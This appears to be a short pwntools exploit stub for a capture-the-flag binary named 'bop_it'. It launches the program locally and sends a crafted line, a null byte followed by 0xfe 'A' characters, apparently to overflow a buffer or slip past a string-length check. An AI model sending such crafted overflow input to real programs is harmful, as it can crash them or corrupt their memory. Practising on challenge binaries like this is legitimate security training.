from pwn import *

p = process(["./bop_it"])
p.sendline("\0" + "A" * 0xfe)